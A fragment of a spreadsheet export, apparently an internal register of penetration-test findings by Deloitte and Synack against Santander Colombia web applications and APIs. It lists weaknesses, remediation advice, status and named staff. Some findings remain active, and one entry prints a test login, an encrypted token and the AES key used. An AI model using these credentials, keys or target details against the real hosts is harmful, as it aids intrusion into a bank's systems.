    <s v="La vulnerabilidad de TLS MAC calculation timing attack o LUCKY13 es una vulnerabilidad de cifrado que aplica a la implementación de Transport Layer Security (TLS) que utilizan el modo de cifrado CBC._x000a_Este ataque consiste en detectar pequeñas diferencias de tiempo cuando se producen errores TLS generados a base de mandar peticiones maliciosas al servidor. Con estos ataques es posible descifrar bloques TLS, aunque la cantidad de peticiones depende del tipo de conexión, el ruido y el algoritmo de MAC utilizado."/>
    <s v="Se recomienda deshabilitar el modo de cifrado CBC y aplicar los parches disponibles."/>
    <s v="Es posible utilizar mecanismos de cifrado considerados inseguros en las comunicaciones con los servidores, lo que podría permitir a un eventual atacante comprometer la confidencialidad de la información intercambiada entre un cliente y el servidor, y en algunos casos también provocar indisponibilidad del servidor."/>
    <s v="1° Fecha: 31/10/2024"/>
    <s v="Escalado: 01/12/2022_x000a_Escalado: 27/02/2023_x000a_Escalado: 29/06/2023_x000a_Escalado: 12/07/2023_x000a_Escalado: 19/04/2024_x000a__x000a_Revisar con SDS México"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="198"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="Supernet/Empresas"/>
    <s v="MAN-33d25a19"/>
    <s v="SC-22-CNMPO-006-CO-002"/>
    <x v="102"/>
    <m/>
    <s v="Solved"/>
    <x v="2"/>
    <n v="2.6"/>
    <m/>
    <m/>
    <s v="https://www.santander.com.co/Empresas/"/>
    <m/>
    <m/>
    <d v="2022-11-28T00:00:00"/>
    <n v="1303"/>
    <d v="2023-03-28T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2025-03-26T00:00:00"/>
    <s v="Se ha observado que el recurso afectado posiblemente no implementa un Rate Limiter (limitador de velocidad), lo que permite a los usuarios realizar varias solicitudes por segundo, en nuestro caso fuimos capaces de realizar 93 peticiones en un segundo."/>
    <s v="Se recomienda analizar la posibilidad de implementar un Rate Limiter para el recurso afectado, limitando las solicitudes por segundo y por hora para cada usuario. Además, se recomienda considerar revisar los estándares de desarrollo y configuración para asegurar que se establezcan Rate Limiters en todos los servicios y sistemas."/>
    <s v="Un Rate Limiter se usa para controlar el tráfico enviado o recibido en la API. Un usuario mal intencionado que abuse del recurso afectado podría enviar una gran cantidad de solicitudes en un intervalo de tiempo relativamente corto, con la ayuda de herramientas automatizadas, y causar una carga computacional muy alta en el servidor. Esto podría potencialmente causar una denegación del servicio y hacer que el recurso afectado no esté disponible."/>
    <s v="1° Fecha: 31/10/2024"/>
    <s v="Escalado: 01/12/2022_x000a_Escalado: 27/02/2023_x000a_Escalado: 29/06/2023_x000a_Escalado: 12/07/2023_x000a_Escalado: 19/04/2024_x000a__x000a_Escalar con el WAF"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="199"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Supernet/Empresas"/>
    <s v="MAN-33d25a49"/>
    <s v="SC-22-CNMPO-006-AP-003"/>
    <x v="103"/>
    <m/>
    <s v="Solved"/>
    <x v="2"/>
    <n v="7.5"/>
    <m/>
    <m/>
    <s v="https://www.santander.com.co/Empresas/"/>
    <m/>
    <m/>
    <d v="2022-11-28T00:00:00"/>
    <n v="1303"/>
    <d v="2023-03-28T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2024-12-03T00:00:00"/>
    <s v="Se ha observado la presencia de una librería que se encuentran desactualizada. La librería observada, junto con las vulnerabilidades identificadas se detallan a continuación:_x000a_• https://www.santander.com.co/Empresas/scripts.dcb54f8925a643cd5303.js"/>
    <s v="Se recomienda analizar la posibilidad de actualizar la librería afectada a la última versión disponible. Adicionalmente se recomienda realizar el monitoreo regular de las actualizaciones de las librerías en uso para todas las aplicaciones y asegurarse de instalarlas en un tiempo prudencial."/>
    <s v="Un individuo malicioso podría comprometer con mayor facilidad la librería afectada, ya que la versión observada posee vulnerabilidades y/o debilidades de seguridad previamente reportadas. En consecuencia, un individuo malicioso podría intentar explotarlas para comprometer a los usuarios de la aplicación."/>
    <s v="1° Fecha: 16/01/2023_x000a_2° Fecha: 09/08/2024_x000a_3° Fecha: 18/10/2024"/>
    <s v="Escalado: 01/12/2022_x000a_Escalado: 27/02/2023_x000a_Escalado: 29/06/2023_x000a_Escalado: 12/07/2023_x000a_Escalado: 19/04/2024"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="200"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <m/>
    <m/>
    <m/>
    <s v="Portal Web"/>
    <s v="MAN-33cfe9d5"/>
    <s v="SC-22-CNMPA-004-CO-001"/>
    <x v="104"/>
    <m/>
    <s v="Solved"/>
    <x v="2"/>
    <n v="2.9"/>
    <m/>
    <m/>
    <s v="www.santander.com.co"/>
    <m/>
    <m/>
    <d v="2022-11-18T00:00:00"/>
    <n v="1313"/>
    <d v="2023-03-18T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2023-07-10T00:00:00"/>
    <s v="Se ha detectado que es posible enumerar el nombre corto de un archivo en el recurso. El archivo encontrado corresponde a “a.aspx”"/>
    <s v="Se recomienda deshabilitar la creación de nombres cortos en caso de que no fuera requerida por necesidades del negocio."/>
    <s v="Un individuo malicioso podría aprovechar esta vulnerabilidad para intentar enumerar nombres cortos de directorios y archivos válidos alojados en el servidor que potencialmente pudieran contener información sensible, para luego ejecutar también ataques específicos con el fin de obtener el nombre completo (nombre largo). Esto podría permitir al individuo malicioso ganar acceso no autorizado a los archivos afectados, si los mismos no se encuentran protegidos por un esquema de control acceso adecuado."/>
    <m/>
    <s v="Certificada"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="201"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal Web"/>
    <s v="MAN-33cfe9d8"/>
    <s v="SC-22-CNMPA-004-AP-002"/>
    <x v="105"/>
    <m/>
    <s v="Active"/>
    <x v="2"/>
    <n v="2.6"/>
    <m/>
    <m/>
    <s v="www.santander.com.co"/>
    <m/>
    <m/>
    <d v="2022-11-19T00:00:00"/>
    <n v="1312"/>
    <d v="2023-03-19T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Se ha observado que el servidor devuelve información potencialmente sensible como el nombre del usuario y el IDE usado al acceder al siguiente recurso:_x000a_• www.santander.com.co/js/jscookies/cookies-utils.js"/>
    <s v="Se recomienda revisar la configuración asociada al componente que produce la explosión de información sensible, con el fin de analizar las diferentes opciones para mitigar la exposición, por ejemplo realizar un sanitizado de los comentarios en los archivos productivos."/>
    <s v="Un individuo malicioso podría aprovechar la información expuesta para planificar y realizar ataques más precisos hacia la infraestructura de la aplicación."/>
    <s v="Pre:_x000a_1° Fecha: 23/08/2024_x000a__x000a_Pro:_x000a_1° Fecha: 30/09/2024"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="202"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <m/>
    <m/>
    <m/>
    <s v="Portal Web"/>
    <s v="MAN-33cfe9d2"/>
    <s v="SC-22-CNMPA-004-CO-003"/>
    <x v="106"/>
    <m/>
    <s v="Solved"/>
    <x v="2"/>
    <n v="2.6"/>
    <m/>
    <m/>
    <s v="www.santander.com.co"/>
    <m/>
    <m/>
    <d v="2022-11-20T00:00:00"/>
    <n v="1311"/>
    <d v="2023-03-20T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2023-05-10T00:00:00"/>
    <s v="Durante las pruebas se observó que al extraer los metadatos de varios documentos “.pdf”, estos revelan el nombre del autor que los escribió. Los recursos afectados son:_x000a_• https://www.santander.com.co/recursos/archivos/proyecto-distribucion-utilidades-aprobado-aga.pdf_x000a_• https://www.santander.com.co/recursos/archivos/informacion-revelante-aga.pdf_x000a_• https://www.santander.com.co/recursos/archivos/2-proyecto-utilidad-o-perdida.pdf_x000a_• https://www.santander.com.co/recursos/archivos/8-decisiones-asamblea.pdf"/>
    <s v="Se recomienda eliminar toda la información contenida en los metadatos de los documentos generados y/o publicados en la aplicación. Además, se recomienda implementar un procedimiento para controlar los documentos a publicar, de manera tal de garantizar que los mismos no contengan información sensible de la organización en sus metadatos."/>
    <s v="Un atacante podría aprovechar la información relevada a través de los metadatos contenidos en documentos “.pdf” para llevar a cabo ataques de mayor envergadura mediante técnicas de ingeniería social o atacando las tecnologías utilizadas dentro de la organización."/>
    <m/>
    <s v="Certificada"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="203"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <m/>
    <m/>
    <m/>
    <s v="Confirming &amp; Factoring\Bot"/>
    <s v="MAN-33d3204c"/>
    <s v="SC-22-CNMPO-007-AP-001"/>
    <x v="103"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <n v="6.1"/>
    <s v="CVE-2019-11358_x000a_CVE-2020-11022_x000a_CVE-2020-11023"/>
    <m/>
    <s v="confirming-factoring.santander.com.co"/>
    <m/>
    <m/>
    <d v="2022-12-09T00:00:00"/>
    <n v="1292"/>
    <d v="2023-03-09T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <s v="27/032023"/>
    <s v="Se ha observado la presencia de una librería que se encuentran desactualizada. La librería observada._x000a_jQuery - 1.3.2"/>
    <s v="Se recomienda analizar la posibilidad de actualizar la librería afectada a la última versión disponible. Adicionalmente se recomienda realizar el monitoreo regular de las actualizaciones de las librerías en uso para todas las aplicaciones y asegurarse de instalarlas en un tiempo prudencial."/>
    <s v="Un individuo malicioso podría comprometer con mayor facilidad la librería afectada, ya que la versión observada posee vulnerabilidades y/o debilidades de seguridad previamente reportadas. En consecuencia, un individuo malicioso podría intentar explotarlas para comprometer a los usuarios de la aplicación."/>
    <d v="2023-02-10T00:00:00"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="204"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <m/>
    <m/>
    <m/>
    <s v="Confirming &amp; Factoring\Bot"/>
    <s v="MAN-33d32042"/>
    <s v="SC-22-CNMPO-007-CO-002"/>
    <x v="107"/>
    <m/>
    <s v="Dismissed"/>
    <x v="2"/>
    <n v="2.9"/>
    <m/>
    <m/>
    <s v="confirming-factoring.santander.com.co"/>
    <m/>
    <m/>
    <d v="2022-12-09T00:00:00"/>
    <n v="1292"/>
    <d v="2023-04-08T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2023-03-07T00:00:00"/>
    <s v="La aplicación es susceptible a la enumeración de nombres cortos de archivos y directorios. Cuando un nuevo archivo es creado en un ambiente Windows, se crea también un nombre corto compatible con el formato 8.3 de MS-DOS para dicho archivo. Este nombre corto permite a programas basados en MS-DOS o Windows 16 bits acceder a archivos con nombres largos._x000a__x000a_Se ha detectado que es posible enumerar el nombre corto de un archivo en el recurso. El archivo encontrado corresponde a “a.asp”"/>
    <s v="Se recomienda deshabilitar la creación de nombres cortos en caso de que no fuera requerida por necesidades del negocio."/>
    <s v="Un individuo malicioso podría aprovechar esta vulnerabilidad para intentar enumerar nombres cortos de directorios y archivos válidos alojados en el servidor que potencialmente pudieran contener información sensible, para luego ejecutar también ataques específicos con el fin de obtener el nombre completo (nombre largo). Esto podría permitir al individuo malicioso ganar acceso no autorizado a los archivos afectados, si los mismos no se encuentran protegidos por un esquema de control acceso adecuado."/>
    <d v="2023-03-10T00:00:00"/>
    <s v="Falso positivo"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="205"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="Confirming &amp; Factoring\Bot"/>
    <s v="MAN-33d32043"/>
    <s v="SC-22-CNMPO-007-CO-003"/>
    <x v="102"/>
    <m/>
    <s v="Solved"/>
    <x v="2"/>
    <n v="2.6"/>
    <m/>
    <m/>
    <s v="confirming-factoring.santander.com.co"/>
    <m/>
    <m/>
    <d v="2022-12-09T00:00:00"/>
    <n v="1292"/>
    <d v="2023-04-08T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2025-03-04T00:00:00"/>
    <s v="La vulnerabilidad de potencial Rate Limiter no implementado hace referencia al faltante de un limitador de velocidad para evitar que el sistema sea vulnerable a ataques de tipo DoS._x000a__x000a_Se ha observado que el recurso afectado posiblemente no implementa un Rate Limiter (limitador de velocidad), lo que permite a los usuarios realizar varias solicitudes por segundo, en nuestro caso fuimos capaces de realizar 102 peticiones en un segundo."/>
    <s v="Se recomienda analizar la posibilidad de implementar un Rate Limiter para el recurso afectado, limitando las solicitudes por segundo y por hora para cada usuario. Además, se recomienda considerar revisar los estándares de desarrollo y configuración para asegurar que se establezcan Rate Limiters en todos los servicios y sistemas."/>
    <s v="Un Rate Limiter se usa para controlar el tráfico enviado o recibido en la API. Un usuario mal intencionado que abuse del recurso afectado podría enviar una gran cantidad de solicitudes en un intervalo de tiempo relativamente corto, con la ayuda de herramientas automatizadas, y causar una carga computacional muy alta en el servidor. Esto podría potencialmente causar una denegación del servicio y hacer que el recurso afectado no esté disponible."/>
    <s v="1° Fecha 10/03/2023_x000a_2° Fecha: 12/02/2024_x000a_3° Fecha: 31/07/2024"/>
    <s v="Certificada"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="206"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Confirming &amp; Factoring\Bot"/>
    <s v="MAN-33d3204d"/>
    <s v="SC-22-CNMPO-007-AP-004"/>
    <x v="108"/>
    <m/>
    <s v="Active"/>
    <x v="2"/>
    <n v="3.7"/>
    <m/>
    <m/>
    <s v="confirming-factoring.santander.com.co"/>
    <m/>
    <m/>
    <d v="2022-12-09T00:00:00"/>
    <n v="1292"/>
    <d v="2023-04-08T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La vulnerabilidad de evasión de captcha hace referencia a la utilización de imágenes que pueden ser resueltas por medio de herramientas OCR, lo que podría derivar en ataques de fuerza bruta y enumeración de usuarios._x000a__x000a_Se ha observado que se puede extraer el mismo captcha que devuelve la aplicación en el formulario del login si se envía el mismo JSESSIONID que se utiliza en el login, al navegar a la siguiente URL:_x000a_• https://confirming-factoring.santander.com.co/factoring/seam/resource/captcha_x000a_Posterior a esto se observó que es posible resolver el captcha con ayuda de una herramienta OCR."/>
    <s v="Se recomienda implementar un mecanismo de captcha que siempre cambie la imagen independientemente del JSESSIONID utilizado. Además se recomienda utilizar sistemas que realicen una generación aleatoria de los gráficos asignados a los caracteres del “CAPTCHA”, con el fin de que los gráficos no sean fácilmente resueltos por herramientas OCR."/>
    <s v="Un individuo malicioso podría aprovechar esta vulnerabilidad para obtener la imagen del captcha que devuelve la aplicación en el login y automatizar el proceso de extracción de texto del captcha, lo cual le permitiría realizar consultas repetitivas sobre el formulario. Las mismas podrían eventualmente utilizarse para realizar ataques de fuerza bruta o enumeración de usuarios."/>
    <s v="1: Fecha 12/02/2024"/>
    <s v="BOT considera que aunque se pueda reconocer el CAPTCHA no es posible explotar el tema ya que el sistema maneja el contador de intentos antes de bloquear a un usuario_x000a__x000a_Se debe enviar la propuesta generada por BOT, y enviar el detalle tecnico para revisión"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="207"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <m/>
    <m/>
    <m/>
    <s v="Confirming &amp; Factoring\Bot"/>
    <s v="MAN-33d3204e"/>
    <s v="SC-22-CNMPO-007-AP-005"/>
    <x v="109"/>
    <m/>
    <s v="Solved"/>
    <x v="2"/>
    <n v="1.6"/>
    <m/>
    <m/>
    <s v="confirming-factoring.santander.com.co"/>
    <m/>
    <m/>
    <d v="2022-12-09T00:00:00"/>
    <n v="1292"/>
    <d v="2023-04-08T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2023-07-10T00:00:00"/>
    <s v="La vulnerabilidad de session fixation o fijación de sesión en español, hace referencia a la práctica insegura de conservar el mismo valor de las cookies de sesión antes y después de la autenticación._x000a__x000a_Se ha observado que la aplicación no cambia el valor del identificador de sesión luego de un intento de autenticación exitoso."/>
    <s v="Se recomienda analizar y modificar el módulo de gestión de sesiones de la aplicación, de manera tal que el identificador de sesión se cambie una vez que el usuario se autentica de manera exitosa. Además, se recomienda revisar los estándares de desarrollo para asegurarse que contemplen la renovación de los identificadores de sesión para lograr consistencia en las aplicaciones de la organización."/>
    <s v="Un individuo malicioso que logre obtener el identificador de sesión (cookie) de un usuario, podría aguardar a que este usuario se autentique y su identificador de sesión obtenga privilegios de usuario autenticado, para luego recuperar la sesión y acceder a la aplicación con los mismos privilegios concedidos al usuario legítimo."/>
    <d v="2023-03-10T00:00:00"/>
    <s v="Certificada"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="208"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <m/>
    <m/>
    <m/>
    <s v="API Prospera"/>
    <s v="MAN-33d542f2"/>
    <s v="SC-22-CNMPO-008-AP-001"/>
    <x v="110"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <n v="4.3"/>
    <m/>
    <m/>
    <s v="https://prospera.santanderconsumer.co"/>
    <m/>
    <m/>
    <d v="2022-12-16T00:00:00"/>
    <n v="1285"/>
    <d v="2023-03-16T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2023-03-07T00:00:00"/>
    <s v="Se ha invocado a la API a través de la URL afectada utilizando el siguiente JSON:_x000a_• {&quot;usuario&quot;:&quot;PREHPROS01&quot;,&quot;clave&quot;:&quot;deloitte&quot;,&quot;tabletUUID&quot;:&quot;e10adc3949ba59abbe56e057f20f883e&quot;,&quot;apkVersion&quot;:&quot;3.3.6&quot;}_x000a_El token posee un usuario válido pero una contraseña invalida. Utilizando la clave AES se cifró el JSON generando el siguiente token:_x000a_• U2FsdGVkX19JBZnh0/ft7HyEXxUVHsamlZhNOp7Kiexjs85SDIXiQIeKlpfAUBPS7MM6h5jbHBY6yZ6nTWNS3cYOhFC3zY4gIoyvjCPwLEWoNVc4ZFb5RRehe5zSPZCV/tgzCvUqUb+rHJX9zkVZwe4WFAT0Ekg5zN+vbka6dpuri46DNezj0/ATMOa/pnhD_x000a_De esa forma se invocó a la URL descrita y se obtuvo una respuesta válida. La llave utilizada el día 14/12/2022 fue &quot;20221216202408142022120420671214&quot;."/>
    <s v="Se recomienda modificar la aplicación para garantizar que todas las funcionalidades privadas o que formen parte de un flujo de operación, puedan ser accedidas únicamente por usuarios que se encuentren autenticados con credenciales válidas y con los privilegios adecuados."/>
    <s v="La observación identificada podría permitir a un usuario malintencionado, acceder a información conociendo solamente un nombre de usuario válido, pudiendo de esta forma recopilar información interna de la organización y a partir de esta planificar un ataque enfocado."/>
    <m/>
    <s v="Certificada"/>
    <s v="Martha Johanna Sanchez Sanchez"/>
  </r>
  <r>
    <n v="209"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <m/>
    <m/>
    <m/>
    <s v="API Prospera"/>
    <s v="MAN-33d542f3"/>
    <s v="SC-22-CNMPO-008-AP-002"/>
    <x v="96"/>
    <m/>
    <s v="Solved"/>
    <x v="2"/>
    <n v="3.7"/>
    <m/>
    <m/>
    <s v="https://prospera.santanderconsumer.co"/>
    <m/>
    <m/>
    <d v="2022-12-16T00:00:00"/>
    <n v="1285"/>
    <d v="2023-04-15T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2023-07-10T00:00:00"/>
    <s v="Se ha observado que al enviar ciertas solicitudes que son consideradas invalidas a la aplicación se generan mensajes de error propios de los componentes del ambiente, los que son propagados a la interfaz de usuario._x000a__x000a_"/>
    <s v="Se deben controlar todas las entradas o valores que el aplicativo recibe por parte del cliente, y realizar un tratamiento seguro de sus valores evitando proporcionar información útil a un posible atacante. Adicionalmente para no proporcionar información al atacante se recomienda personalizar las páginas de error para que no sean descriptivas, dando siempre el mínimo de información necesaria."/>
    <s v="El manejo inadecuado de errores puede presentar una variedad de problemas de seguridad para un sitio web. El problema más común es cuando los mensajes de error internos detallados, como los rastreos de la pila, los volcados de la base de datos y los códigos de error, se muestran al usuario. Estos mensajes revelan detalles de implementación que nunca deberían revelarse. Dichos detalles pueden proporcionar a un posible atacante pistas importantes sobre el funcionamiento interno de la aplicación y facilitar el proceso de explotación."/>
    <d v="2023-03-31T00:00:00"/>
    <s v="Certificada"/>
    <s v="Martha Johanna Sanchez Sanchez"/>
  </r>
  <r>
    <n v="210"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="API Prospera"/>
    <s v="MAN-33d542f4"/>
    <s v="SC-22-CNMPO-008-CO-003"/>
    <x v="111"/>
    <m/>
    <s v="Active"/>
    <x v="2"/>
    <n v="2.6"/>
    <m/>
    <m/>
    <s v="https://prospera.santanderconsumer.co"/>
    <m/>
    <m/>
    <d v="2022-12-16T00:00:00"/>
    <n v="1285"/>
    <d v="2023-04-15T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Se ha comprobado que el encabezado “Server” en la respuesta de la aplicación revela información del servidor web en uso._x000a__x000a_La información revelada por este encabezado es:_x000a_• server: openresty"/>
    <s v="Se recomienda evitar que la aplicación devuelva al usuario información relativa a la estructura interna de la misma, así como de las tecnologías utilizadas para su desarrollo o de la infraestructura que la sustenta. Este tipo de información puede ser accesible a través de las cabeceras de respuesta de la aplicación, mensajes de error y/o páginas por defecto. En concreto, se recomienda retirar el encabezado “Server” de la respuesta HTML."/>
    <s v="Se ha detectado que la aplicación devuelve información acerca de las tecnologías utilizadas para desarrollar la aplicación y/o de la infraestructura utilizada para sustentar la misma. Esta información podría ser utilizada por un atacante con el objetivo de recabar información para ataques futuros."/>
    <s v="1° Fecha: 15/12/2023"/>
    <s v="Escalado: 20/12/2022_x000a_Escalado: 27/02/2023"/>
    <s v="Martha Johanna Sanchez Sanchez"/>
  </r>
  <r>
    <n v="211"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="API Prospera"/>
    <s v="MAN-33d5ae0c"/>
    <s v="SC-22-CNMPO-008-CO-004"/>
    <x v="101"/>
    <m/>
    <s v="Active"/>
    <x v="2"/>
    <n v="2.6"/>
    <m/>
    <m/>
    <s v="https://prospera.santanderconsumer.co"/>
    <m/>
    <m/>
    <d v="2022-12-16T00:00:00"/>
    <n v="1285"/>
    <d v="2023-04-15T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La vulnerabilidad de TLS MAC Calculation Timing Attack o LUCKY13 es una vulnerabilidad de cifrado que aplica a la implementación de Transport Layer Security (TLS) que utilizan el modo de cifrado CBC_x000a__x000a_Este ataque consiste en detectar pequeñas diferencias de tiempo cuando se producen errores TLS generados a base de mandar peticiones maliciosas al servidor. Con estos ataques es posible descifrar bloques TLS, aunque la cantidad de peticiones depende del tipo de conexión, el ruido y el algoritmo de MAC utilizado."/>
    <s v="Se recomienda deshabilitar el modo de cifrado CBC y aplicar los parches disponibles."/>
    <s v="Se ha detectado que es posible utilizar mecanismos de cifrado considerados inseguros en las comunicaciones con los servidores, lo que podría permitir a un eventual atacante comprometer la confidencialidad de la información intercambiada entre un cliente y el servidor, y en algunos casos también provocar indisponibilidad del servidor."/>
    <s v="1° Fecha: 15/12/2023"/>
    <s v="Escalado: 20/12/2022_x000a_Escalado: 27/02/2023_x000a_Escalado: 03/03/20203_x000a_Escalado: 12/12/2024"/>
    <s v="Martha Johanna Sanchez Sanchez"/>
  </r>
  <r>
    <n v="212"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="API Prospera"/>
    <s v="MAN-33d542f6"/>
    <s v="SC-22-CNMPO-008-CO-006"/>
    <x v="102"/>
    <m/>
    <s v="Solved"/>
    <x v="2"/>
    <n v="2.6"/>
    <m/>
    <m/>
    <s v="https://prospera.santanderconsumer.co"/>
    <m/>
    <m/>
    <d v="2022-12-16T00:00:00"/>
    <n v="1285"/>
    <d v="2023-04-15T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2025-03-26T00:00:00"/>
    <s v="La vulnerabilidad de potencial Rate Limiter no implementado hace referencia al faltante de un limitador de velocidad para evitar que el sistema sea vulnerable a ataques de tipo DoS._x000a_Se ha observado que el recurso afectado posiblemente no implementa un Rate Limiter (limitador de velocidad), lo que permite a los usuarios realizar varias solicitudes por segundo, en nuestro caso fuimos capaces de realizar 80 peticiones en un segundo."/>
    <s v="Se recomienda analizar la posibilidad de implementar un Rate Limiter para el recurso afectado, limitando las solicitudes por segundo y por hora para cada usuario. Además, se recomienda considerar revisar los estándares de desarrollo y configuración para asegurar que se establezcan Rate Limiters en todos los servicios y sistemas."/>
    <s v="Un Rate Limiter se usa para controlar el tráfico enviado o recibido en la API. Un usuario mal intencionado que abuse del recurso afectado podría enviar una gran cantidad de solicitudes en un intervalo de tiempo relativamente corto, con la ayuda de herramientas automatizadas, y causar una carga computacional muy alta en el servidor. Esto podría potencialmente causar una denegación del servicio y hacer que el recurso afectado no esté disponible."/>
    <s v="1° Fecha: 15/12/2023"/>
    <s v="Escalado: 20/12/2022_x000a_Escalado: 27/02/2023_x000a_Escalado: 03/03/20203_x000a_Escalado: 12/12/2024"/>
    <s v="Martha Johanna Sanchez Sanchez"/>
  </r>
  <r>
    <n v="213"/>
    <s v="BSNC"/>
    <s v="Synack"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Confirming &amp; Factoring\Bot"/>
    <s v="HELICOPTER-W388-1"/>
    <m/>
    <x v="112"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <n v="5.3"/>
    <s v="CVE-2011-4969_x000a_CVE-2012-6708_x000a_CVE-2019-11358"/>
    <m/>
    <s v="confirming-factoring.santander.com.co"/>
    <m/>
    <m/>
    <d v="2023-02-12T00:00:00"/>
    <n v="1227"/>
    <d v="2023-05-13T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2023-03-27T00:00:00"/>
    <s v="Las bibliotecas comunes de JavaScript suelen disfrutar de la ventaja de estar muy auditadas. Esto puede significar que los_x000a_rápidamente identificados y parcheados, lo que resulta en un flujo constante de actualizaciones de seguridad que necesitan ser_x000a_aplicar. Aunque puede ser tentador ignorar las actualizaciones, usar una librería a la que le faltan parches de seguridad puede hacer que su sitio web sea excepcionalmente fácil de explotar._x000a_su sitio web excepcionalmente fácil de explotar. Por lo tanto, es importante asegurarse de que las actualizaciones de seguridad disponibles se aplican con prontitud._x000a_de seguridad disponibles._x000a_A partir de la evaluación de la aplicación web, se ha identificado que la aplicación utiliza una librería javascript vulnerable que es vulnerable a ataques XSS._x000a_vulnerable a ataques XSS. La versión vulnerable podría encontrarse en el código javascript._x000a_"/>
    <s v="Desarrolle una estrategia de gestión de parches para garantizar que las actualizaciones de seguridad se aplican rápidamente a todas las bibliotecas de terceros de su aplicación._x000a_de terceros en su aplicación. Además, considere la posibilidad de reducir la superficie de ataque eliminando las bibliotecas que ya no se utilicen._x000a_en uso."/>
    <s v="El uso de bibliotecas JavaScript de terceros puede introducir una serie de vulnerabilidades basadas en DOM, incluyendo algunas_x000a_que pueden ser usadas para secuestrar cuentas de usuario como DOM-XSS."/>
    <m/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="214"/>
    <s v="BSNC"/>
    <s v="Synack"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Supernet/Empresas"/>
    <s v="HELICOPTER-W388-4"/>
    <m/>
    <x v="113"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <n v="5.3"/>
    <m/>
    <m/>
    <s v="https://www.santander.com.co/Empresas/"/>
    <m/>
    <m/>
    <d v="2023-02-12T00:00:00"/>
    <n v="1227"/>
    <d v="2023-05-13T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2023-03-24T00:00:00"/>
    <s v="Fuzzing y enumeración revelaron una página de inicio de sesión en_x000a_https://www.santander.com.co/Empresas/#/administrationGeneral/login que es el inicio de sesión backend CMS_x000a_expuesta al público. Esto viola la política de Santander que establece: &quot;El cliente está particularmente interesado en cualquier_x000a_portales de administración expuestos para este activo, ya que va en contra de la política del Santander tenerlos expuestos en Internet,_x000a_tanto si están protegidos por contraseña como si no&quot;."/>
    <s v="Asegurar el directorio con un error 403 Forbidden, mientras que la lista blanca de direcciones IP específicas que se les permite acceder a este directorio, que se puede hacer a través de archivos de configuración (.htaccess para servidores Apache)._x000a_acceder a este directorio, lo que se puede hacer a través de archivos de configuración (.htaccess para servidores Apache y_x000a_nginx.conf para servidores nginx) o utilizando un Firewall de Aplicaciones Web."/>
    <s v="Si bien esto no es una amenaza inmediata, un panel de acceso administrativo expuesto y obvio puede hacer que sea_x000a_para los atacantes, especialmente si los controles de acceso se limitan a las combinaciones de nombre de usuario y contraseña._x000a_de usuario y contraseña."/>
    <m/>
    <s v="Falso positivo"/>
    <s v="Jaime Orlando Vargas Martinez"/>
